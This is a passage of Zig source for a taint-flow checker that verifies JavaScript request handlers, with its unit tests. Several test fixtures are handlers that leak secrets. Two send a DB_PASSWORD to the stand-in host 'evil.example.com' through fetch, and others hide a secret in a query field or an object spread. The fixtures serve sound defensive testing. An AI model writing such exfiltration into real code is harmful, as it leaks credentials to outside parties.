                return counterexample.negate(inner);
            },
            .binary_op => {
                const bin = self.ir_view.getBinary(cond) orelse return null;
                if (bin.op != .strict_eq and bin.op != .strict_neq) return null;

                const raw = self.extractLiteralReqComparison(bin.left, bin.right) orelse
                    self.extractLiteralReqComparison(bin.right, bin.left) orelse
                    self.extractOptionalAbsentComparison(bin.left, bin.right) orelse
                    self.extractOptionalAbsentComparison(bin.right, bin.left) orelse
                    return null;
                return if (bin.op == .strict_eq) raw else counterexample.negate(raw);
            },
            .member_access => {
                return self.extractResultOkConstraint(cond);
            },
            // exhaustive: null means no path constraint could be read from this
            // condition. Constraints only sharpen a counterexample witness; a
            // missing one makes the witness less specific and never decides
            // whether a diagnostic fires.
            else => return null,
        }
    }

    /// Recognise `req.method === "POST"` / `req.url === "/path"` shapes
    /// (either direction). Handles only direct property access on the
    /// request binding; `const method = req.method` indirection would
    /// need a second binding_origin track and is a follow-up.
    fn extractLiteralReqComparison(
        self: *FlowChecker,
        prop_node: NodeIndex,
        lit_node: NodeIndex,
    ) ?counterexample.WitnessConstraint {
        const lit_tag = self.ir_view.getTag(lit_node) orelse return null;
        if (lit_tag != .lit_string) return null;
        const str_idx = self.ir_view.getStringIdx(lit_node) orelse return null;
        const value = self.ir_view.getString(str_idx) orelse return null;

        if (self.isReqProperty(prop_node, "method")) {
            return .{ .req_method = value };
        }
        if (self.isReqProperty(prop_node, "url") or self.isReqProperty(prop_node, "path")) {
            return .{ .req_url = value };
        }
        return null;
    }

    /// Recognise `value === undefined` where value was produced by an
    /// optional-returning module call. The equality branch needs an absent
    /// stub; the caller negates it for `!==`.
    fn extractOptionalAbsentComparison(
        self: *FlowChecker,
        value_node: NodeIndex,
        undefined_node: NodeIndex,
    ) ?counterexample.WitnessConstraint {
        if (self.ir_view.getTag(value_node) != .identifier or
            self.ir_view.getTag(undefined_node) != .lit_undefined)
        {
            return null;
        }
        const binding = self.ir_view.getBinding(value_node) orelse return null;
        const key = packBindingKey(binding.scope_id, binding.slot);
        const meta = self.binding_origin.get(key) orelse return null;
        switch (meta.returns) {
            .optional_string, .optional_object, .optional_number => {},
            .boolean,
            .number,
            .string,
            .object,
            .undefined,
            .unknown,
            .result,
            .dict,
            .bytes,
            => return null,
        }
        return .{ .stub_falsy = .{
            .module = meta.module,
            .func = meta.func,
            .returns = meta.returns,
            .call_index = meta.call_index,
        } };
    }

    /// Recognise `result.ok` where `result` is an identifier bound to a
    /// Result-returning module call (validateJson, jwtVerify, etc.).
    fn extractResultOkConstraint(
        self: *FlowChecker,
        member_node: NodeIndex,
    ) ?counterexample.WitnessConstraint {
        const member = self.ir_view.getMember(member_node) orelse return null;
        const prop_name = self.resolveAtomName(member.property) orelse return null;
        if (!std.mem.eql(u8, prop_name, "ok")) return null;

        const obj_tag = self.ir_view.getTag(member.object) orelse return null;
        if (obj_tag != .identifier) return null;
        const binding = self.ir_view.getBinding(member.object) orelse return null;
        const key = packBindingKey(binding.scope_id, binding.slot);
        const meta = self.binding_origin.get(key) orelse return null;
        if (meta.returns != .result) return null;

        return .{ .result_ok = .{
            .module = meta.module,
            .func = meta.func,
            .returns = meta.returns,
            .call_index = meta.call_index,
        } };
    }

    fn resolveAtomName(self: *const FlowChecker, atom_idx: u16) ?[]const u8 {
        if (self.atoms) |table| {
            const atom: object.Atom = @enumFromInt(atom_idx);
            if (atom.toPredefinedName()) |name| return name;
            return table.getName(atom);
        }
        if (self.ir_view.getString(atom_idx)) |name| return name;
        const atom: object.Atom = @enumFromInt(atom_idx);
        return atom.toPredefinedName();
    }

    fn markAllocationFailure(self: *FlowChecker) void {
        self.allocation_failed = true;
    }
};

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

test "FlowChecker fails closed when taint state cannot allocate" {
    const allocator = std.testing.allocator;
    const source = "function handler(req) { return Response.json(req); }";
    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    defer parser.deinit();
    const root = try parser.parse();
    const view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_fn = @import("handler_verifier.zig").findHandlerFunction(view, root) orelse
        return error.HandlerNotFound;

    var failing = std.testing.FailingAllocator.init(allocator, .{ .fail_index = 0 });
    var checker = FlowChecker.init(failing.allocator(), view, null);
    defer checker.deinit();
    try std.testing.expectError(error.OutOfMemory, checker.check(handler_fn));
}

test "FlowChecker fails closed when diagnostic storage cannot allocate" {
    const allocator = std.testing.allocator;
    const source = "function handler() { return Response.json({ ok: true }); }";
    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    defer parser.deinit();
    const root = try parser.parse();
    const view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_fn = @import("handler_verifier.zig").findHandlerFunction(view, root) orelse
        return error.HandlerNotFound;

    var failing = std.testing.FailingAllocator.init(allocator, .{ .fail_index = 0 });
    var checker = FlowChecker.init(failing.allocator(), view, null);
    defer checker.deinit();
    checker.addDiagnostic(.{
        .severity = .err,
        .kind = .secret_in_response,
        .node = handler_fn,
        .message = "forced diagnostic",
        .help = null,
    });
    try std.testing.expectError(error.OutOfMemory, checker.check(handler_fn));
}

test "FlowChecker captures witness constraints on secret-in-response" {
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  if (secret !== undefined) {
        \\    return Response.json({ leaked: secret });
        \\  }
        \\  return Response.json({ ok: true });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    // Expect exactly one secret-in-response diagnostic, carrying a
    // stub_truthy constraint on the present env value and a tracked env I/O call.
    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind != .secret_in_response) continue;
        found = true;
        try std.testing.expectEqual(
            counterexample.PropertyTag.no_secret_leakage,
            propertyTagForKind(d.kind).?,
        );
        const w = d.witness orelse return error.MissingWitness;
        try std.testing.expectEqual(@as(usize, 1), w.path_constraints.len);
        try std.testing.expect(w.path_constraints[0] == .stub_truthy);
        try std.testing.expectEqualStrings("env", w.path_constraints[0].stub_truthy.func);
        try std.testing.expect(w.io_calls.len >= 1);
        try std.testing.expectEqualStrings("env", w.io_calls[0].func);
    }
    try std.testing.expect(found);
}

test "FlowChecker does not leak sibling-branch I/O calls into the witness" {
    // If a module call happens inside the branch that does NOT reach the
    // sink, the fall-through sink's witness must not include it - otherwise
    // the synthesised stub sequence would drive the handler down the wrong
    // path. Regression test for the shrinkRetainingCapacity fix around
    // `.if_stmt` in walkStmt.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\import { cacheGet } from "zttp:cache";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  if (secret === undefined) {
        \\    const cached = cacheGet("sibling");
        \\    return Response.json({ ok: cached });
        \\  }
        \\  return Response.json({ leaked: secret });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind != .secret_in_response) continue;
        found = true;
        const w = d.witness orelse return error.MissingWitness;
        for (w.io_calls) |call| {
            // `cacheGet` is only called on the sibling branch that returns
            // without leaking. It must not appear in this witness.
            try std.testing.expect(!std.mem.eql(u8, call.func, "cacheGet"));
        }
    }
    try std.testing.expect(found);
}

test "FlowChecker captures stub_truthy on if-else with absent condition" {
    // `if (secret === undefined) { ok } else { leak }` - the else branch's
    // effective constraint requires a present secret value.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  if (secret === undefined) {
        \\    return Response.json({ ok: true });
        \\  } else {
        \\    return Response.json({ leaked: secret });
        \\  }
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind != .secret_in_response) continue;
        found = true;
        const w = d.witness orelse return error.MissingWitness;
        try std.testing.expectEqual(@as(usize, 1), w.path_constraints.len);
        try std.testing.expect(w.path_constraints[0] == .stub_truthy);
        try std.testing.expectEqualStrings("env", w.path_constraints[0].stub_truthy.func);
    }
    try std.testing.expect(found);
}

test "FlowChecker captures req_method constraint from literal comparison" {
    // `if (req.method === "POST") { leak }` - the witness request must be
    // POST, not the default GET, so the handler reaches the sink.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  if (req.method === "POST") {
        \\    return Response.json({ leaked: secret });
        \\  }
        \\  return Response.json({ ok: true });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind != .secret_in_response) continue;
        found = true;
        const w = d.witness orelse return error.MissingWitness;
        try std.testing.expectEqual(@as(usize, 1), w.path_constraints.len);
        try std.testing.expect(w.path_constraints[0] == .req_method);
        try std.testing.expectEqualStrings("POST", w.path_constraints[0].req_method);
    }
    try std.testing.expect(found);
}

test "FlowChecker captures AND chain as multiple constraints" {
    // `if (req.method === "POST" && secret !== undefined) { leak }` produces
    // TWO constraints: the method literal and env presence. The solver turns
    // this into a POST request whose env stub returns a value.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  if (req.method === "POST" && secret !== undefined) {
        \\    return Response.json({ leaked: secret });
        \\  }
        \\  return Response.json({ ok: true });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind != .secret_in_response) continue;
        found = true;
        const w = d.witness orelse return error.MissingWitness;
        try std.testing.expectEqual(@as(usize, 2), w.path_constraints.len);

        var saw_method = false;
        var saw_truthy = false;
        for (w.path_constraints) |c| {
            switch (c) {
                .req_method => |m| {
                    try std.testing.expectEqualStrings("POST", m);
                    saw_method = true;
                },
                .stub_truthy => |info| {
                    try std.testing.expectEqualStrings("env", info.func);
                    saw_truthy = true;
                },
                else => return error.UnexpectedConstraintKind,
            }
        }
        try std.testing.expect(saw_method and saw_truthy);
    }
    try std.testing.expect(found);
}

test "FlowChecker captures one concrete negated request constraint for else AND path" {
    // `!(req.method === "GET" && secret !== undefined)` should use one concrete false
    // clause. Pick a non-GET method and leave the env call on its default
    // truthy stub so replay still leaks the sentinel secret.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  if (req.method === "GET" && secret !== undefined) {
        \\    return Response.json({ ok: true });
        \\  } else {
        \\    return Response.json({ leaked: secret });
        \\  }
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind != .secret_in_response) continue;
        found = true;
        const w = d.witness orelse return error.MissingWitness;
        try std.testing.expectEqual(@as(usize, 1), w.path_constraints.len);
        try std.testing.expect(w.path_constraints[0] == .req_method_not);
        try std.testing.expectEqualStrings("GET", w.path_constraints[0].req_method_not);

        var witness = try counterexample.solve(allocator, .{
            .property = .no_secret_leakage,
            .origin = .{ .line = 1, .column = 1 },
            .sink = .{ .line = 1, .column = 1 },
            .summary = "t",
            .constraints = w.path_constraints,
            .io_calls = w.io_calls,
        });
        defer witness.deinit(allocator);

        try std.testing.expectEqualStrings("POST", witness.request.method);
        try std.testing.expectEqual(@as(usize, 1), witness.io_stubs.len);
        try std.testing.expectEqualStrings("\"secret-sentinel\"", witness.io_stubs[0].result_json);
    }
    try std.testing.expect(found);
}

test "FlowChecker keeps repeated module call constraints tied to call index" {
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const a = env("SECRET_A");
        \\  const b = env("SECRET_B");
        \\  if (a !== undefined) {
        \\    if (b === undefined) {
        \\      return Response.json({ leaked: a });
        \\    }
        \\  }
        \\  return Response.json({ ok: true });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind != .secret_in_response) continue;
        found = true;
        const w = d.witness orelse return error.MissingWitness;
        try std.testing.expectEqual(@as(usize, 2), w.io_calls.len);

        var saw_a_truthy = false;
        var saw_b_falsy = false;
        for (w.path_constraints) |c| {
            switch (c) {
                .stub_truthy => |info| {
                    try std.testing.expectEqual(@as(?u32, 0), info.call_index);
                    saw_a_truthy = true;
                },
                .stub_falsy => |info| {
                    try std.testing.expectEqual(@as(?u32, 1), info.call_index);
                    saw_b_falsy = true;
                },
                else => return error.UnexpectedConstraintKind,
            }
        }
        try std.testing.expect(saw_a_truthy and saw_b_falsy);

        var witness = try counterexample.solve(allocator, .{
            .property = .no_secret_leakage,
            .origin = .{ .line = 1, .column = 1 },
            .sink = .{ .line = 1, .column = 1 },
            .summary = "t",
            .constraints = w.path_constraints,
            .io_calls = w.io_calls,
        });
        defer witness.deinit(allocator);

        try std.testing.expectEqualStrings("\"secret-sentinel\"", witness.io_stubs[0].result_json);
        try std.testing.expectEqualStrings("null", witness.io_stubs[1].result_json);
    }
    try std.testing.expect(found);
}

test "FlowChecker captures result_ok constraint on validated path" {
    // `if (r.ok) { leak(env()) }` - the witness must make validateJson
    // return an ok Result so the sink is reachable.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\import { validateJson } from "zttp:validate";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  const r = validateJson(0, "{}");
        \\  if (r.ok) {
        \\    return Response.json({ leaked: secret });
        \\  }
        \\  return Response.json({ ok: true });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind != .secret_in_response) continue;
        found = true;
        const w = d.witness orelse return error.MissingWitness;
        var saw_result_ok = false;
        for (w.path_constraints) |c| {
            if (c == .result_ok) {
                try std.testing.expectEqualStrings("validateJson", c.result_ok.func);
                saw_result_ok = true;
            }
        }
        try std.testing.expect(saw_result_ok);
    }
    try std.testing.expect(found);
}

test "FlowChecker records validated defended path reaching egress body" {
    const allocator = std.testing.allocator;
    const source =
        \\import { validateObject } from "zttp:validate";
        \\function handler(req) {
        \\  const v = validateObject(req.body, "{}");
        \\  fetchSync("https://api.example.com", { method: "POST", body: v.value });
        \\  return Response.json({ ok: true });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var saw_injection = false;
    var saw_input_validated = false;
    for (checker.getDefendedPaths()) |d| {
        if (d.property == .injection_safe) {
            saw_injection = true;
            try std.testing.expectEqual(SafeForm.validated, d.safe_form);
            try std.testing.expect(d.guard_func != null);
            try std.testing.expectEqualStrings("validateObject", d.guard_func.?);
        }
        if (d.property == .input_validated) saw_input_validated = true;
    }
    try std.testing.expect(saw_injection);
    try std.testing.expect(saw_input_validated);
    // The property itself must actually hold for the card to render.
    try std.testing.expect(checker.getProperties().injection_safe);
}

test "FlowChecker flags a secret reaching a module fetch body" {
    // Regression: the egress sink check recognized only the bare `fetchSync`
    // global, so a secret sent via the documented `zttp:fetch` API was not
    // flagged and no_secret_leakage was falsely proven.
    const allocator = std.testing.allocator;
    const source =
        \\import { fetch } from "zttp:fetch";
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("DB_PASSWORD");
        \\  fetch("https://evil.example.com", { method: "POST", body: secret });
        \\  return Response.json({ ok: true });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    try std.testing.expect(!checker.getProperties().no_secret_leakage);
}

test "FlowChecker flags a secret reaching a var-bound module fetch body" {
    // Regression (#11): the egress sink check ran only on bare-statement calls
    // (.expr_stmt / .call), so binding the fetch result -- the dominant idiom,
    // `const r = fetch(url, { body: secret })` -- bypassed the check entirely
    // and falsely proved no_secret_leakage. The .var_decl arm now sink-checks
    // its initializer too.
    const allocator = std.testing.allocator;
    const source =
        \\import { fetch } from "zttp:fetch";
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("DB_PASSWORD");
        \\  const r = fetch("https://evil.example.com", { method: "POST", body: secret });
        \\  return Response.json({ ok: r.ok });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    try std.testing.expect(!checker.getProperties().no_secret_leakage);
}

test "FlowChecker flags a secret reaching a module fetch query field" {
    // Regression: the new `query` init field is appended to the egress URL at
    // runtime, but inferObjectBodyLabels returned only the `body` value when a
    // body key was present, so a secret in `query` escaped every sink check and
    // no_secret_leakage was falsely proven and signed into the attestation.
    const allocator = std.testing.allocator;
    const source =
        \\import { fetch } from "zttp:fetch";
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("UPSTREAM_KEY");
        \\  fetch("https://api.example.com/v1", { method: "POST", body: "hello", query: { key: secret } });
        \\  return Response.json({ ok: true });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    try std.testing.expect(!checker.getProperties().no_secret_leakage);
}

test "FlowChecker flags a secret reaching egress via an options spread" {
    // Regression: a secret carried into the options object through an object
    // spread (`...{ query: { key: secret } }`) was invisible to the per-field
    // body/query/headers extractors, so it escaped every egress sink and
    // no_secret_leakage was falsely proven. The `body:` early return made it
    // worse by short-circuiting the whole-object fallback.
    const allocator = std.testing.allocator;
    const source =
        \\import { fetch } from "zttp:fetch";
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("UPSTREAM_KEY");
        \\  fetch("https://api.example.com/v1", { body: "hello", ...{ query: { key: secret } } });
        \\  return Response.json({ ok: true });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    try std.testing.expect(!checker.getProperties().no_secret_leakage);
}

test "FlowChecker proves no_secret_leakage for a benign module fetch" {
    // Negative control for the fix above: a module fetch carrying no secret
    // must still discharge no_secret_leakage (no false positive).
    const allocator = std.testing.allocator;
    const source =
        \\import { fetch } from "zttp:fetch";
        \\function handler(req) {
        \\  fetch("https://api.example.com", { method: "POST", body: "hello" });
        \\  return Response.json({ ok: true });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    try std.testing.expect(checker.getProperties().no_secret_leakage);
}

test "FlowChecker records validated defended path reaching an HTML response" {
    const allocator = std.testing.allocator;
    const source =
        \\import { escapeHtml } from "zttp:text";
        \\function handler(req) {
        \\  const raw = req.headers.get("x-name");
        \\  const safe = escapeHtml(raw);
        \\  return Response.html(safe);
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDefendedPaths()) |d| {
        if (d.property == .injection_safe) {
            found = true;
            try std.testing.expectEqual(SafeForm.validated, d.safe_form);
            try std.testing.expect(d.guard_func != null);
            try std.testing.expectEqualStrings("escapeHtml", d.guard_func.?);
        }
    }
    try std.testing.expect(found);
    try std.testing.expect(checker.getProperties().injection_safe);
}

test "FlowChecker records never_reached defended path for unused secret" {
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const k = env("SECRET_KEY");
        \\  return Response.json({ ok: true });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDefendedPaths()) |d| {
        if (d.property == .no_secret_leakage) {
            found = true;
            try std.testing.expectEqual(SafeForm.never_reached, d.safe_form);
            try std.testing.expect(d.guard_func == null);
        }
    }
    try std.testing.expect(found);
}

test "FlowChecker records no defended path for a leaking secret" {
    // A handler that actually leaks must not also claim a defended path for
    // the same property: violation and defended are mutually exclusive.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const k = env("SECRET_KEY");
        \\  return Response.json({ leaked: k });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    try std.testing.expect(!checker.getProperties().no_secret_leakage);
    for (checker.getDefendedPaths()) |d| {
        try std.testing.expect(d.property != .no_secret_leakage);
    }
}

test "LabelSet operations in flow context" {
    // Verify secret + credential merge
    const secret = LabelSet{ .secret = true };
    const cred = LabelSet{ .credential = true };
    const merged = LabelSet.merge(secret, cred);
    try std.testing.expect(merged.has(.secret));
    try std.testing.expect(merged.has(.credential));
    try std.testing.expect(!merged.has(.user_input));
}

test "isSensitiveEnvName" {
    try std.testing.expect(FlowChecker.isSensitiveEnvName("DB_PASSWORD"));
    try std.testing.expect(FlowChecker.isSensitiveEnvName("API_KEY"));
    try std.testing.expect(FlowChecker.isSensitiveEnvName("JWT_SECRET"));
    try std.testing.expect(FlowChecker.isSensitiveEnvName("ACCESS_TOKEN"));
    try std.testing.expect(FlowChecker.isSensitiveEnvName("PRIVATE_KEY"));
    try std.testing.expect(FlowChecker.isSensitiveEnvName("db_password"));
    try std.testing.expect(FlowChecker.isSensitiveEnvName("Auth_Header"));

    try std.testing.expect(!FlowChecker.isSensitiveEnvName("APP_NAME"));
    try std.testing.expect(!FlowChecker.isSensitiveEnvName("PORT"));
    try std.testing.expect(!FlowChecker.isSensitiveEnvName("NODE_ENV"));
    try std.testing.expect(!FlowChecker.isSensitiveEnvName("LOG_LEVEL"));
    try std.testing.expect(!FlowChecker.isSensitiveEnvName("DATABASE_URL"));
}

test "FlowProperties defaults to all proven" {
    const props = FlowProperties{};
    try std.testing.expect(props.no_secret_leakage);
    try std.testing.expect(props.no_credential_leakage);
    try std.testing.expect(props.input_validated);
    try std.testing.expect(props.pii_contained);
}

test "parseDataLabel maps all known strings" {
    try std.testing.expectEqual(DataLabel.secret, parseDataLabel("secret").?);
